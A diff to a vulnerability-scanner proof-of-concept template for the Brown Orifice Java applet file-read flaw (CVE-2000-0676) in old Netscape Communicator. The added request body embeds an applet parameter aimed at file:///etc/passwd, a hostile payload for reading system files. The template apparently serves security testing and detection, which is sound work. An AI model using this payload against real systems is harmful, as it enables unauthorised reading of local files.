@@ -1,30 +1,33 @@
 [info]
 author = "ave"
-description = "检测目标是否运行恶意Java小程序服务，该小程序利用Netscape Communicator 4.04-4.74中netscape.net.URLConnection类未正确调用SecurityManager.checkRead/checkConnect的漏洞，通过file://协议读取目标系统任意文件"
+description = "检测 Netscape Communicator 4.04-4.74 中 Java applet 权限绕过漏洞（Brown Orifice）。通过构造恶意 HTML 页面加载 Java applet，利用 netscape.net.URLConnection 以 file:// 协议读取本地任意文件，无需用户交互即可窃取敏感信息。"
 id = "POC-AVE-2000-0530"
-name = "Netscape Communicator 4.x Java Applet URL Read PoC"
+name = "Netscape Communicator/Navigator Java Applet URL Read (Brown Orifice) PoC"
 severity = "medium"
-tags = [
-    "cve-2000-0676",
-    "netscape",
-    "java-applet",
-    "arbitrary-file-read",
-]
+tags = ["ave-2000-0530"]
 vuln_id = [
     "CVE-2000-0676",
     "AVE-2000-0530",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/BrownOrifice.class"
+path = "/{{BaseURL}}/brown-orifice.html"
 protocol = "http"
 
 [poc.requests.body]
-content = ""
+content = """
+<HTML>
+<HEAD><TITLE>Brown Orifice PoC</TITLE></HEAD>
+<BODY>
+<APPLET CODE="BrownOrifice.class" WIDTH=1 HEIGHT=1>
+<PARAM NAME="url" VALUE="file:///etc/passwd">
+</APPLET>
+</BODY>
+</HTML>"""
 type = "raw"
 
 [[poc.requests.matchers]]
@@ -32,24 +35,6 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "java",
-    "class",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/applet.html"
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "applet",
-    "APPLET",
+    "Brown Orifice",
+    "netscape.net.URLConnection",
 ]
